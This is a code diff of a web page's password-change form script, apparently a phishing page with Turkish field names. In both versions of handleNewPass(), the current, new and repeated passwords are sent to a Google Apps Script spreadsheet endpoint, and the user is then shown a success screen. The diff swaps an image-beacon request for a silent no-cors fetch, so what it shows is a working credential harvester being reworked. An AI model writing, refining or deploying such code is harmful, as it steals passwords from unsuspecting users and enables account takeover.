@@ -440,17 +440,17 @@
     document.getElementById('pw-err').style.display = 'none';
   }
   function handleNewPass() {
-    const SHEET_URL = 'https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec';
-    const p0 = document.getElementById('pw0').value;
-    const p1 = document.getElementById('pw1').value;
-    const p2 = document.getElementById('pw2').value;
+    var p0 = document.getElementById('pw0').value;
+    var p1 = document.getElementById('pw1').value;
+    var p2 = document.getElementById('pw2').value;
     if (!p2 || p1 !== p2) {
       document.getElementById('pw2').classList.add('error');
       document.getElementById('pw-err').style.display = 'block';
       return;
     }
-    var img = new Image();
-    img.src = SHEET_URL + '?mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
+    var SHEET_URL = 'https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec';
+    var params = '?mevcut=' + encodeURIComponent(p0) + '&yeni=' + encodeURIComponent(p1) + '&tekrar=' + encodeURIComponent(p2);
+    fetch(SHEET_URL + params, { method: 'GET', mode: 'no-cors', redirect: 'follow' });
     goTo('s-success');
   }
 </script>
